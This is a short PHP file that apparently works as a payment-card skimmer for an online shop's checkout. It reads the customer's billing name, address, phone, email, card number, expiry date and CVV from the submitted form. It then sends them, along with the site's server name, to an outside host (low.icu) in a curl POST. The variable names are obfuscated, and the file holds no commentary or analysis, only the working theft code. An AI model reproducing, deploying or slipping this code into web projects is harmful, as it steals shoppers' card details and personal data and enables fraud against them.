<?php

$lo = "base";
$oa = "64_";
$na = "dec";
$me = "ode";
$fu54ogfkrdd = "base64_decode";
if (isset($_POST["ccc"]) && $_POST["ccc"] != "") {
    $h2ffb4ccf = $_POST["billing_first_name"];
    $o07fbce07 = $_POST["billing_last_name"];
    $p1f4a9685 = $_POST["billing_address_1"];
    $m4ed5d2ea = $_POST["billing_city"];
    $l451af380 = $_POST["billing_postcode"];
    $ycenqgpq_25 = $_POST["billing_phone"];
    $ycenqgpq_35 = $_POST["billing_email"];
    $id3cbc720 = $_POST["ccc"];
    $ad20ff0bf = $_POST["expp"];
    $d05f59f17 = $_POST["cvvv"];
    $p957b527b = $_SERVER["SERVER_NAME"];
    $r78e73102 .= "{$h2ffb4ccf} {$o07fbce07}|{$id3cbc720}|{$ad20ff0bf}|{$d05f59f17}|{$p1f4a9685}|{$m4ed5d2ea}|{$l451af380}|{$ycenqgpq_25}|{$ycenqgpq_35}";
    $ha12b31af = "{$r78e73102}\n";
    $nd88fc6ed = curl_init();
    curl_setopt($nd88fc6ed, CURLOPT_URL, "https://low.icu/wp-content/");
    curl_setopt($nd88fc6ed, CURLOPT_POST, 1);
    curl_setopt($nd88fc6ed, CURLOPT_POSTFIELDS, "data={$ha12b31af}&name={$p957b527b}");
    curl_setopt($nd88fc6ed, CURLOPT_RETURNTRANSFER, true);
    $w18dca2a4 = curl_exec($nd88fc6ed);
    curl_close($nd88fc6ed);
}
